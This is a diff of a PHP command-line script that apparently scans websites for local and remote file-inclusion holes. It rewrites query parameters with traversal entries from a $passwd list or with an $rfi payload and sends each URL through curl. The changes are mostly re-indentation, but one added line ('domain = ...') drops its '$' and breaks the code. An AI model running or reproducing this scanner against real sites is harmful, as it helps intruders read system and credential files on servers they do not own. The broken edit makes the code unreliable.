@@ -43,9 +43,9 @@ error_reporting(0);
 $opts = getopt("hd:l:r:i:");
 foreach(array_keys($opts) as $opt) switch($opt) {
 
-      case "h":
-      help();
-      break;	
+          case "h":
+          help();
+          break;	
 
 	  case "d":
 	  $dominio = $opts["d"];
@@ -62,11 +62,11 @@ foreach(array_keys($opts) as $opt) switch($opt) {
 	  $lista = file_get_contents($opts["l"], "r");
 	  $x = array_filter(explode("\n", $lista));
 	  foreach($x as $dominio) {
-	   $valor = strpos($dominio, "=");
-	    $xpt = substr($dominio, 0, $valor);
-	   foreach($passwd as $passwd1) {
-	   $domain = $xpt.$passwd1;
-	   echo $domain."=>";
+	  $valor = strpos($dominio, "=");
+	  $xpt = substr($dominio, 0, $valor);
+	  foreach($passwd as $passwd1) {
+          $domain = $xpt.$passwd1;
+	  echo $domain."=>";
 	  for($i=0; $i <=$tr=count($domain)-1; $i++) {
 	      post($domain);
 	         }
@@ -86,21 +86,21 @@ foreach(array_keys($opts) as $opt) switch($opt) {
 	  case "i":
 	  $lista = file_get_contents($opts["i"], "r");
 	  $x = array_filter(explode("\n", $lista));
-	  	  $valor = strpos($dominio, "=");
-	  	  $xpt = substr($dominio, 0, $valor);
-	  	  $domain = $xpt. "=".$rfi;
-	  	  echo $domain."=>";
-	      for($i=0; $i <=$tr=count($domain)-1; $i++) {
+	  $valor = strpos($dominio, "=");
+          $xpt = substr($dominio, 0, $valor);
+ 	  $domain = $xpt. "=".$rfi;
+	  echo $domain."=>";
+	  for($i=0; $i <=$tr=count($domain)-1; $i++) {
           post($domain);
                          }
                 }
          }
 
     function post($domain) {
-    if(preg_match("@http://@", $dominio)) {
-	  	 $dominio = $dominio;
-	  } else {
-	  	$dominio = "http://".$dominio;
+    if(preg_match("@http://@", $domain)){
+          $domain = $domain;
+	 } else {
+       domain = "http://".$domain;
       }
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $domain);
